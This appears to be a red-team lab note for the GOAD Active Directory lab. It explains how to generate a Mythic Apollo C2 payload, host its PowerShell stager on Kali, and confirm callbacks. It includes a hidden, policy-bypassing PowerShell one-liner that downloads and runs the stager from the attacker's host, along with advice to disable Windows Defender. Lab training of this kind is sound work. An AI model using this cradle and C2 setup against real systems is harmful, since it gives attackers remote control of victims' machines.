---
title: Mythic - Payload Generation
category: Configuration
environment: GOAD
execution_context: "[KALI] Mythic UI"
tags:
  - Mythic
  - Payload
  - Apollo
  - Stager
date_created: 2026-08-23
status: VERIFY-BEFORE-USE
---

# Mythic — Payload Generation

> [!IMPORTANT]
> Before generating a payload, verify your Kali IP address.
> Every payload embeds the C2 callback IP. A wrong IP means callbacks will fail silently.

> [!WARNING]
> This documentation is for the **authorized GOAD lab environment only**.

---

## Prerequisites

- [ ] Mythic server is running (see [[Mythic - Installation and Verification]])
- [ ] Apollo agent is installed in Mythic
- [ ] HTTP C2 profile is installed
- [ ] Kali IP on 192.168.56.0/24 is confirmed (`ip addr show`)
- [ ] GOAD VMs are running and reachable

---

## Step 1 — Confirm Your Kali IP

```
Execution Context: [KALI]
Shell: Bash
Privileges: User
```

```bash
ip addr show vmnet7
# Verify the IP is 192.168.56.1
# Record this IP — it goes into callback_host
```

**Your Kali IP:** `192.168.56.1`

---

## Step 2 — Generate Apollo Payload in Mythic UI

```
Execution Context: [KALI]
Interface: Mythic Web UI (https://127.0.0.1:7443)
Privileges: Mythic operator login
```

Navigate to: **Payloads → Create**

| Field | Value | Notes |
|---|---|---|
| Payload Type | `apollo` | Windows C# agent |
| C2 Profile | `http` | Use https if TLS is configured |
| callback_host | `http://192.168.56.1` | Verified Kali IP on vmnet7 |
| callback_port | `80` | Must match what your Kali is listening on |
| callback_interval | `10` | Seconds between check-ins |
| callback_jitter | `0.30` | 30% randomization (OPSEC) |
| Output type | `exe` or `PowerShell` | PowerShell stager is more flexible |

> [!CAUTION]
> The existing notes used `https://mythic-server:443` as callback_host. This placeholder will not work.
> Replace with your actual verified Kali IP.

Click **Create Payload** and wait for compilation.

---

## Step 3 — Download the Stager

After compilation completes:
- Click the download icon next to your new payload
- Save to `~/payloads/goad/`

If you chose PowerShell output:
```bash
# The .ps1 file goes in your web root
cp ~/Downloads/stager.ps1 ~/payloads/goad/stager.ps1
```

---

## Step 4 — Start HTTP Server on Kali

```
Execution Context: [KALI]
Shell: Bash
Privileges: root (for port 80)
```

```bash
cd ~/payloads/goad
sudo python3 -m http.server 80
```

> [!NOTE]
> Port 80 requires root. If you cannot use port 80, change `callback_port` in payload settings to 8080 or another unprivileged port and use `python3 -m http.server 8080` without sudo.

---

## Step 5 — Deliver the Stager

The stager delivery method depends on the initial access vector. See:
- [[GOAD - Exploitation - Initial Access Vectors]] for GOAD-specific delivery

Example PowerShell one-liner (to be run on a Windows GOAD VM):

```
Execution Context: [VICTIM-PS]
Shell: PowerShell
Privileges: User (or whatever context initial access provides)
```

> [!IMPORTANT]
> The command below uses the verified Kali IP (`192.168.56.1`).

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.1/stager.ps1')"
```

---

## Step 6 — Confirm Callback

In Mythic UI → **Callbacks**

A new callback should appear within `callback_interval` seconds showing:
- Internal IP (should be 192.168.56.x)
- Username
- Hostname (should match a GOAD VM name)
- Integrity level (Medium/High/System)

**Record:**
- Callback ID: VERIFY
- Hostname: VERIFY
- Username: VERIFY
- Integrity: VERIFY

---

## Common Mistakes

- Using placeholder `mythic-server` instead of actual Kali IP
- Generating payload before confirming Kali IP
- Starting HTTP server in the wrong directory (stager.ps1 won't be served)
- Port 80 conflict (another service using port 80 — check with `sudo ss -tlnp | grep :80`)
- Forgetting to disable Windows Defender on GOAD VMs before delivering stager

---

## Expected Results

| Step | Expected Outcome |
|---|---|
| Payload generated | No errors in Mythic UI, file available for download |
| HTTP server started | `python3 -m http.server 80` shows `Serving HTTP on 0.0.0.0 port 80` |
| Stager delivered | PowerShell executes without errors |
| Callback received | New entry in Mythic UI Callbacks within 10-20 seconds |

---

## If It Fails

| Symptom | Likely Cause | Action |
|---|---|---|
| No callback after 60s | Wrong callback_host IP | Regenerate payload with correct IP |
| No callback after 60s | HTTP server not running | Start `sudo python3 -m http.server 80` |
| No callback after 60s | Windows Defender blocked | Disable Defender first |
| Stager download fails | Wrong stager URL | Verify http://KALI_IP/stager.ps1 returns content |
| PowerShell execution blocked | Execution policy | Use the `-Exec Bypass` flag |

---

## Related Notes

- [[Mythic - Installation and Verification]]
- [[Mythic - Architecture Overview]]
- [[Mythic - Lab Operations - GodPotato and Mimikatz]]
- [[GOAD - Exploitation - Initial Access Vectors]]
